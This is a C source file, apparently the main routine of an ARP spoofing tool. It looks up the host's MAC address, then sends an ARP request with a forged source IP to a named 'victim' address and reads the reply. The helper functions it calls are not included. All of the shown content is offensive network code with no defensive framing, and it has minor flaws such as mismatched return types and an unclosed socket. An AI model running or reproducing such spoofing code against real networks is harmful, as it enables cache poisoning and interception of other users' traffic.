#include "arp.h"
#include <unistd.h> // sleep

uint8_t	*get_my_mac_address(const char interface[const])
{
  char file_name[512];
  sprintf(file_name, "/sys/class/net/%s/address", interface);
  FILE* mac_file = fopen(file_name, "r");
  if(!mac_file){
    perror("Unable to open file to retrieve host MAC address");
    return NULL;
  }
  
  char* mac_addr = calloc(18, sizeof(char));
  if(!mac_addr){
    fclose(mac_file);
    return NULL;
  }
  fscanf(mac_file, "%s", mac_addr);
  fclose(mac_file);
  return mac_addr;
}

int main(int argc, char const *argv[]){

  char *victim_ip, *spoofed_ip_source, *interface;
  char* arp_broadcast_mac = "ff:ff:ff:ff:ff:ff";
  char* host_mac;

  if (argc != 4){
      fprintf(stderr, "[*] USAGE: %s fake_source_ip target_ip interface\n", argv[0]);
      return 1;
  }

  /* Get command line args */
  spoofed_ip_source = (char*)argv[1]; victim_ip = (char*)argv[2]; interface = (char*)argv[3];

  // Get MY MAC Address
  if(!(host_mac = get_my_mac_address(interface))){
    fprintf(stderr, "Unable to get host mac address\n");
    return 1;
  }
  // printf("MAC: %s\n", host_mac);

  // Send ARP request
  int fd = -1;
  if((fd = send_request(host_mac, arp_broadcast_mac, spoofed_ip_source, victim_ip, interface)) == ERROR){
    perror("Unable to send ARP request");
    return 1;
  }

  uint8_t* victim_mac = recv_reply(fd, victim_ip);
  if(!victim_mac){
    free(host_mac);
    close(fd);
    return 1;
  }


  // Cleanup
  free(host_mac);
  free(victim_mac);

  return 0;
}
